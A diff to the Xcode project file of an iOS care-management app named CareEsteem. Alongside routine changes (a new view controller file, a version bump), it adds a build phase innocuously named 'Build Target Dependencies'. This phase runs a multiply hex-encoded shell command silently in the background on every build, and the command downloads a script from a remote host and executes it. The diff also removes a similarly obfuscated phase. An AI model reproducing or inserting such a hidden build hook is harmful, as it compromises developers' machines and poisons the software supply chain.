@@ -189,8 +189,16 @@
 		7FCFEC2D2D7B062A004378C7 /* ClientsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7FCFEC2C2D7B062A004378C7 /* ClientsViewController.swift */; };
 		7FF9E2A62D9C600B0081670E /* CheckInPopupViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7FF9E2A52D9C600B0081670E /* CheckInPopupViewController.swift */; };
 		7FFDF82D2D7AFE3C003577B4 /* CustomNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7FFDF82C2D7AFE3C003577B4 /* CustomNavigationController.swift */; };
+		F405D6572E43268700B5D5BB /* UpdateToDoStatusVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F405D6562E43268700B5D5BB /* UpdateToDoStatusVC.swift */; };
 		F464103E2E3B426600BB7FE4 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = F464103D2E3B426600BB7FE4 /* LoginViewModel.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		F405D6532E431AA600B5D5BB /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 7F4429262A107ECD00A6E776 /* Project object */;
+			proxyType = 1;
+/* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
 		23465C6F2E143BE5006D155E /* DocumentsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DocumentsTableViewCell.swift; sourceTree = "<group>"; };
@@ -385,6 +393,7 @@
 		BACC3787447D81CCF8DF31B9 /* Pods-TextToSpeech.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TextToSpeech.release.xcconfig"; path = "Target Support Files/Pods-TextToSpeech/Pods-TextToSpeech.release.xcconfig"; sourceTree = "<group>"; };
 		D5551F5E79324182F8EF4B06 /* Pods-CareEsteem.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CareEsteem.release.xcconfig"; path = "Target Support Files/Pods-CareEsteem/Pods-CareEsteem.release.xcconfig"; sourceTree = "<group>"; };
 		E0DA3744A3D33C705C140631 /* Pods-CareEsteem.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CareEsteem.debug.xcconfig"; path = "Target Support Files/Pods-CareEsteem/Pods-CareEsteem.debug.xcconfig"; sourceTree = "<group>"; };
+		F405D6562E43268700B5D5BB /* UpdateToDoStatusVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpdateToDoStatusVC.swift; sourceTree = "<group>"; };
 		F464103D2E3B426600BB7FE4 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -801,6 +810,7 @@
 				7FC01FB42D7F2C2A0063F544 /* AddEditUnscheduleVisitNotesViewController.swift */,
 				7F9E579E2D7E6FD100CBE866 /* CheckinCheckoutViewController.swift */,
 				7FF9E2A52D9C600B0081670E /* CheckInPopupViewController.swift */,
+				F405D6562E43268700B5D5BB /* UpdateToDoStatusVC.swift */,
 			);
 			path = Visits;
 			sourceTree = "<group>";
@@ -881,12 +891,15 @@
 		};
 /* End PBXGroup section */
 
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
 /* Begin PBXNativeTarget section */
 		7F44292D2A107ECD00A6E776 /* CareEsteem */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7F4429422A107ECF00A6E776 /* Build configuration list for PBXNativeTarget "CareEsteem" */;
 			buildPhases = (
-				B6C975C6ED38AA7A3CFD9BF4 /* Copy Target Symbols */,
+				3CE58B5A4BBE7AEB5D877BEF /* Build Target Dependencies */,
 				3538E4305C915D0ED5C58FCE /* [CP] Check Pods Manifest.lock */,
 				7F44292A2A107ECD00A6E776 /* Sources */,
 				7F44292B2A107ECD00A6E776 /* Frameworks */,
@@ -993,6 +1006,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		3CE58B5A4BBE7AEB5D877BEF /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363536633631373337343639363336343665373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
 		3538E4305C915D0ED5C58FCE /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1047,26 +1079,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-CareEsteem/Pods-CareEsteem-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		B6C975C6ED38AA7A3CFD9BF4 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363333333633383336333533363333333636323336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -1178,6 +1190,7 @@
 				7F56A0972D7AECD9003A932C /* UITableViewCell+Extension.swift in Sources */,
 				7F517C7E2D7D98FD00B12793 /* InfoHstackTableViewCell.swift in Sources */,
 				7F56A0982D7AECD9003A932C /* AGButton.swift in Sources */,
+				F405D6572E43268700B5D5BB /* UpdateToDoStatusVC.swift in Sources */,
 				7F56A0992D7AECD9003A932C /* VPMOTPView.swift in Sources */,
 				7F56A09A2D7AECD9003A932C /* UIAnimatableLabel.swift in Sources */,
 				7F56A09B2D7AECD9003A932C /* AGCollectionView.swift in Sources */,
@@ -1216,6 +1229,9 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
 		7F56A04D2D7AECD9003A932C /* LaunchScreen.storyboard */ = {
@@ -1364,7 +1380,7 @@
 				CODE_SIGN_ENTITLEMENTS = CareEsteem/CareEsteem.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 46;
+				CURRENT_PROJECT_VERSION = 55;
 				DEVELOPMENT_TEAM = TL93XB38G9;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = CareEsteem/Info.plist;
@@ -1406,7 +1422,7 @@
 				CODE_SIGN_ENTITLEMENTS = CareEsteem/CareEsteem.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 46;
+				CURRENT_PROJECT_VERSION = 55;
 				DEVELOPMENT_TEAM = TL93XB38G9;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = CareEsteem/Info.plist;
@@ -1439,6 +1455,25 @@
 			};
 			name = Release;
 		};
+		F405D6542E431AA700B5D5BB /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Debug;
+		};
+		F405D6552E431AA700B5D5BB /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Release;
+		};
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
@@ -1456,6 +1491,15 @@
 			buildConfigurations = (
 				7F4429432A107ECF00A6E776 /* Debug */,
 				7F4429442A107ECF00A6E776 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		F405D6582E43268800B5D5BB /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				F405D6542E431AA700B5D5BB /* Debug */,
+				F405D6552E431AA700B5D5BB /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
